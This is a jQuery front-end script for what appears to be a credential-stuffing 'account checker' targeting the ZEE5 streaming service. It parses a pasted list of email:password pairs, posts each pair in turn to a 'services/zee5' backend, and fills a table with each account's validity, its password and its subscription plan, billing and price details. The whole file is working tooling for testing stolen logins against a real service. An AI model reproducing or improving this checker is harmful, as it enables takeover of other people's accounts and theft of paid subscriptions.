var splited;
$( document ).ready(function() {
    $("#submitForm").click(function(){
        var textArea = $("#accounts").val();
        splited = textArea.split("\n").map(e=>e.split(' ')[0]).filter(e=>validateEmail(e.split(':')[0]));
        promises(splited.map(e=>e.split(' ')[0]),0);
        console.log("splited",splited);

    });
});

function promises(arr,i){
    if(i === arr.length)
        return;
    $.post(
        {
            type:'POST',
            url:'services/zee5',
            contentType: 'application/json',
            data: JSON.stringify({
                login:arr[i].split(":")[0],
                password:arr[i].split(":")[1]
            }),
            success: function(data) {
                promises(arr,i+1);
                console.log('post success');
                console.log(JSON.stringify(data));
                prependerModified(data);
            },
            error: function(data) {
                promises(arr,i+1);
                console.log('post error');
                console.log(JSON.stringify(data));
            }
        }
    )
    $('#progressBar').css('width',(i+1) / splited.length * 100 +"%");

}



function prependerModified(account) {
    var
        email = account.accountLogin.email,
        password = account.accountLogin.password,
        plan = 'X',
        planType='X',
        planTitle='X',
        state='X',
        freeTrial='X',
        start= 'X',
        end='X',
        country='X',
        numSup='X',
        billingCycle='X',
        billingCycleType='X',
        valid_for_all_countries='X',
        countries='X',
        price='X'
    ;
    if (account.validAccount) {
            plan = account.accountInfo.plan;
            planType=account.accountInfo.planType,
            planTitle=account.accountInfo.planTitle,
            state=account.accountInfo.state,
            freeTrial=account.accountInfo.freeTrial,
            start= account.accountInfo.start,
            end=account.accountInfo.end,
            country=account.accountInfo.country,
            numSup=account.accountInfo.numSup,
            billingCycle=account.accountInfo.billingCycle,
            billingCycleType=account.accountInfo.billingCycleType,
            valid_for_all_countries=account.accountInfo.valid_for_all_countries,
            countries=account.accountInfo.countries,
            price=account.accountInfo.price;
    }
    $('tbody').prepend('<tr>' +
        '      <th scope="row">' + account.validAccount + '</th>' +
        '      <td>' + email + '</td>' +
        '      <td>' + password + '</td>' +
        '      <td>' + plan + '</td>' +
        '      <td>' + planType + '</td>' +
        '      <td>' + planTitle + '</td>' +
        '      <td>' + state + '</td>' +
        '      <td>' + freeTrial + '</td>' +
        '      <td>' + start + '</td>' +
        '      <td>' + end + '</td>' +
        '      <td>' + country + '</td>' +
        '      <td>' + numSup + '</td>' +
        '      <td>' + billingCycle + '</td>' +
        '      <td>' + billingCycleType + '</td>' +
        '      <td>' + valid_for_all_countries + '</td>' +
        '      <td>' + countries + '</td>' +
        '      <td>' + price + '</td>' +
        '    </tr>')

}
function validateEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
